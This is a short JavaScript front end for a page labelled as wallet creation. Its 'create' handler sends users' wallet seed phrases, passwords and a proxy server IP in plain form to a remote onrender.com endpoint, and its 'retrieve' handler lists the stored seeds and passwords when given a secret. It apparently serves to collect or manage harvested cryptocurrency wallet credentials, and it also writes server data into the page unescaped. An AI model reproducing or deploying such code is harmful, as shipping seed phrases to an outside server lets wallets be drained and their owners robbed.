document.getElementById('createWallet').addEventListener('click', async () => {
  const seed = document.getElementById('seed').value;
  const password = document.getElementById('password').value;
  const ip = document.getElementById('ip').value;

  const response = await fetch('https://wallet-gzms.onrender.com/wallet/store', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify({ seed, password, ip }),
  });

  if (response.ok) {
      alert('Wallet created successfully!');
      document.getElementById('seed').value = '';
      document.getElementById('password').value = '';
        document.getElementById('ip').value = '';
  } else {
      alert('Failed to create wallet.');
  }
});

document.getElementById('retrieveWallets').addEventListener('click', async () => {
  const secret = document.getElementById('secret').value;

  const response = await fetch('https://wallet-gzms.onrender.com/wallet/retrieve', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify({ secret }),
  });

  if (response.ok) {
      document.getElementById('secret').value = '';

      const wallets = await response.json();
      const walletsDiv = document.getElementById('wallets');
      walletsDiv.innerHTML = '<h3 class="text-xl font-medium mb-2">Wallets:</h3>';
      wallets.forEach(wallet => {
          const seed = `${wallet.seed.slice(0, 4)}...${wallet.seed.slice(-4)}`;
          const password = `${wallet.password.slice(0, 4)}...${wallet.password.slice(-4)}`;

          walletsDiv.innerHTML += `<div class="mb-2"><strong>Seed:</strong> ${seed} | <strong>Password:</strong> ${password}</div> <div class="mb-2"><strong>Proxy Server IP:</strong> ${wallet.ip}</div>`;
      });
  } else {
      alert('Failed to retrieve wallets.');
  }
});
